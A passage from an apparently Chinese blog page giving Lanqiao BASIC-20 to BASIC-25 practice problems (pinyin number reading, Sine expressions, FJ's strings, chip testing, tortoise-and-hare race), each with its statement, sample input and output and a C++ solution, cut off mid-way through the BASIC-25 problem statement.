class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num = n<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> odd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = num; j &gt;= i; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span> || odd==<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Impossible&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                odd += <span class="number">1</span>;</span><br><span class="line">                flag += n/<span class="number">2</span> - i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i] == s[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = j; k &lt; num; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    swap(s[k], s[k+<span class="number">1</span>]);</span><br><span class="line">                    flag++;</span><br><span class="line">                &#125;</span><br><span class="line">                num--;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; flag;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-20-VIP试题-数的读法"><a href="#BASIC-20-VIP试题-数的读法" class="headerlink" title="BASIC-20    VIP试题 数的读法"></a>BASIC-20    VIP试题 数的读法</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　Tom教授正在给研究生讲授一门关于基因的课程，有一件事情让他颇为头疼：一条染色体上有成千上万个碱基对，它们从0开始编号，到几百万，几千万，甚至上亿。<br>　　比如说，在对学生讲解第1234567009号位置上的碱基时，光看着数字是很难准确的念出来的。<br>　　所以，他迫切地需要一个系统，然后当他输入12 3456 7009时，会给出相应的念法：<br>　　十二亿三千四百五十六万七千零九<br>　　用汉语拼音表示为<br>　　shi er yi san qian si bai wu shi liu wan qi qian ling jiu<br>　　这样他只需要照着念就可以了。<br>　　你的任务是帮他设计这样一个系统：给定一个阿拉伯数字串，你帮他按照中文读写的规范转为汉语拼音字串，相邻的两个音节用一个空格符格开。<br>　　注意必须严格按照规范，比如说“10010”读作“yi wan ling yi shi”而不是“yi wan ling shi”，“100000”读作“shi wan”而不是“yi shi wan”，“2000”读作“er qian”而不是“liang qian”。</li><li>输入格式<br>　　有一个数字串，数值大小不超过2,000,000,000。</li><li>输出格式<br>　　是一个由小写英文字母，逗号和空格组成的字符串，表示该数的英文读法。</li><li>样例输入<br> 1234567009</li><li>样例输出<br> shi er yi san qian si bai wu shi liu wan qi qian ling jiu</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> arr[]=&#123;<span class="string">&quot;ling&quot;</span>, <span class="string">&quot;yi&quot;</span>, <span class="string">&quot;er&quot;</span>, <span class="string">&quot;san&quot;</span>, <span class="string">&quot;si&quot;</span>, <span class="string">&quot;wu&quot;</span>, <span class="string">&quot;liu&quot;</span>, <span class="string">&quot;qi&quot;</span>, <span class="string">&quot;ba&quot;</span>, <span class="string">&quot;jiu&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> brr[]=&#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;shi&quot;</span>, <span class="string">&quot;bai&quot;</span>, <span class="string">&quot;qian&quot;</span>, <span class="string">&quot;wan&quot;</span>, <span class="string">&quot;shi&quot;</span>, <span class="string">&quot;bai&quot;</span>, <span class="string">&quot;qian&quot;</span>, <span class="string">&quot;yi&quot;</span>, <span class="string">&quot;shi&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> num;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num.length(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x = num[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=num.length()<span class="number">-1</span> &amp;&amp; num[i+<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==num.length()<span class="number">-2</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;yi shi&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i==num.length()<span class="number">-6</span> || i==num.length()<span class="number">-10</span>)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;shi&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;yi &quot;</span> &lt;&lt; brr[num.length()-i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; arr[x] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; brr[num.length()-i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-21-VIP试题-Sine之舞"><a href="#BASIC-21-VIP试题-Sine之舞" class="headerlink" title="BASIC-21    VIP试题 Sine之舞"></a>BASIC-21    VIP试题 Sine之舞</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　最近FJ为他的奶牛们开设了数学分析课，FJ知道若要学好这门课，必须有一个好的三角函数基本功。所以他准备和奶牛们做一个“Sine之舞”的游戏，寓教于乐，提高奶牛们的计算能力。<br>　　不妨设<br>　　An=sin(1–sin(2+sin(3–sin(4+…sin(n))…)<br>　　Sn=(…(A1+n)A2+n-1)A3+…+2)An+1<br>　　FJ想让奶牛们计算Sn的值，请你帮助FJ打印出Sn的完整表达式，以方便奶牛们做题。</li><li>输入格式<br>　　仅有一个数：N&lt;201。</li><li>输出格式<br>　　请输出相应的表达式Sn，以一个换行符结束。输出中不得含有多余的空格或换行、回车符。</li><li>样例输入<br> 3</li><li>样例输出<br> ((sin(1)+3)sin(1–sin(2))+2)sin(1–sin(2+sin(3)))+1</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">to_strings</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="built_in">stringstream</span> ss;</span><br><span class="line">    ss&lt;&lt;i;</span><br><span class="line">    ss&gt;&gt;str;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> An[<span class="number">201</span>]=&#123;&#125;;</span><br><span class="line">    An[<span class="number">1</span>] = <span class="string">&quot;sin(1)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; N+<span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        An[i] = <span class="string">&quot;sin(1&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                An[i] += <span class="string">&quot;-sin(&quot;</span>+to_strings(j);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                An[i] += <span class="string">&quot;+sin(&quot;</span>+to_strings(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;i; j++)  </span><br><span class="line">            An[i] += <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> ans = An[<span class="number">1</span>]+<span class="string">&quot;+&quot;</span>+to_strings(N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= N; i++)</span><br><span class="line">        ans = <span class="string">&quot;(&quot;</span>+ans+<span class="string">&quot;)&quot;</span>+An[i]+<span class="string">&quot;+&quot;</span>+to_strings(N-i+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-22-VIP试题-FJ的字符串"><a href="#BASIC-22-VIP试题-FJ的字符串" class="headerlink" title="BASIC-22    VIP试题 FJ的字符串"></a>BASIC-22    VIP试题 FJ的字符串</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br>时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　FJ在沙盘上写了这样一些字符串：<br>　　A1 = “A”<br>　　A2 = “ABA”<br>　　A3 = “ABACABA”<br>　　A4 = “ABACABADABACABA”<br>　　… …<br>　　你能找出其中的规律并写所有的数列AN吗？</li><li>输入格式<br>　　仅有一个数：N ≤ 26。</li><li>输出格式<br>　　请输出相应的字符串AN，以一个换行符结束。输出中不得含有多余的空格或换行、回车符。</li><li>样例输入<br> 3</li><li>样例输出<br> ABACABA</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> arr = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line"></span><br><span class="line">    flag += <span class="string">&quot;A&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; num; i++)</span><br><span class="line">        flag = flag + arr[i] + flag;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; flag;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-23-VIP试题-芯片测试"><a href="#BASIC-23-VIP试题-芯片测试" class="headerlink" title="BASIC-23    VIP试题 芯片测试"></a>BASIC-23    VIP试题 芯片测试</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　有n（2≤n≤20）块芯片，有好有坏，已知好芯片比坏芯片多。<br>　　每个芯片都能用来测试其他芯片。用好芯片测试其他芯片时，能正确给出被测试芯片是好还是坏。而用坏芯片测试其他芯片时，会随机给出好或是坏的测试结果（即此结果与被测试芯片实际的好坏无关）。<br>　　给出所有芯片的测试结果，问哪些芯片是好芯片。</li><li>输入格式<br>　　输入数据第一行为一个整数n，表示芯片个数。<br>　　第二行到第n+1行为n*n的一张表，每行n个数据。表中的每个数据为0或1，在这n行中的第i行第j列（1≤i, j≤n）的数据表示用第i块芯片测试第j块芯片时得到的测试结果，1表示好，0表示坏，i=j时一律为1（并不表示该芯片对本身的测试结果。芯片不能对本身进行测试）。</li><li>输出格式<br>　　按从小到大的顺序输出所有好芯片的编号</li><li>样例输入<br> 3<br> 1 0 1<br> 0 1 0<br> 1 0 1</li><li>样例输出<br> 1 3</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">22</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> num, x;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= num; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">            arr[k] += x;</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num; i++)</span><br><span class="line">        <span class="keyword">if</span> ( arr[i]&gt; num/<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-24-VIP试题-龟兔赛跑预测"><a href="#BASIC-24-VIP试题-龟兔赛跑预测" class="headerlink" title="BASIC-24    VIP试题 龟兔赛跑预测"></a>BASIC-24    VIP试题 龟兔赛跑预测</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　话说这个世界上有各种各样的兔子和乌龟，但是研究发现，所有的兔子和乌龟都有一个共同的特点——喜欢赛跑。于是世界上各个角落都不断在发生着乌龟和兔子的比赛，小华对此很感兴趣，于是决定研究不同兔子和乌龟的赛跑。他发现，兔子虽然跑比乌龟快，但它们有众所周知的毛病——骄傲且懒惰，于是在与乌龟的比赛中，一旦任一秒结束后兔子发现自己领先t米或以上，它们就会停下来休息s秒。对于不同的兔子，t，s的数值是不同的，但是所有的乌龟却是一致——它们不到终点决不停止。<br>　　然而有些比赛相当漫长，全程观看会耗费大量时间，而小华发现只要在每场比赛开始后记录下兔子和乌龟的数据——兔子的速度v1（表示每秒兔子能跑v1米），乌龟的速度v2，以及兔子对应的t，s值，以及赛道的长度l——就能预测出比赛的结果。但是小华很懒，不想通过手工计算推测出比赛的结果，于是他找到了你——清华大学计算机系的高才生——请求帮助，请你写一个程序，对于输入的一场比赛的数据v1，v2，t，s，l，预测该场比赛的结果。</li><li>输入格式<br>　　输入只有一行，包含用空格隔开的五个正整数v1，v2，t，s，l，其中(v1,v2&lt;=100;t&lt;=300;s&lt;=10;l&lt;=10000且为v1,v2的公倍数)</li><li>输出格式<br>　　输出包含两行，第一行输出比赛结果——一个大写字母“T”或“R”或“D”，分别表示乌龟获胜，兔子获胜，或者两者同时到达终点。<br>　　第二行输出一个正整数，表示获胜者（或者双方同时）到达终点所耗费的时间（秒数）。</li><li>样例输入<br> 10 5 5 2 20</li><li>样例输出<br> D<br> 4</li><li>样例输入<br> 10 5 5 1 20</li><li>样例输出<br> R<br> 3</li><li>样例输入<br> 10 5 5 3 20</li><li>样例输出<br>T<br>4</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1, v2, t, s, l;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; t &gt;&gt; s &gt;&gt; l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r1=<span class="number">0</span>, r2=<span class="number">0</span>, time=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (++time)</span><br><span class="line">    &#123;</span><br><span class="line">        r1+=v1; r2+=v2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(r1&gt;=l || r2&gt;=l)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (r1 == r2)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;D&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(r1&gt;=l)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;R&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;T&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; time;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (r1-r2 &gt;= t)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( (l-r2)/v2 &lt;= s )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;T&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; time+(l-r2)/v2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            r2+=v2*s;</span><br><span class="line">            time+=s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BASIC-25-VIP试题-回形取数"><a href="#BASIC-25-VIP试题-回形取数" class="headerlink" title="BASIC-25    VIP试题 回形取数"></a>BASIC-25    VIP试题 回形取数</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li>资源限制<br> 时间限制：1.0s   内存限制：512.0MB</li><li>问题描述<br>　　回形取数就是沿矩阵的边取数，若当前方向上无数可取或已经取过，则左转90度。一开始位于矩阵左上角，方向向下。</li><li>输入格式<br>　　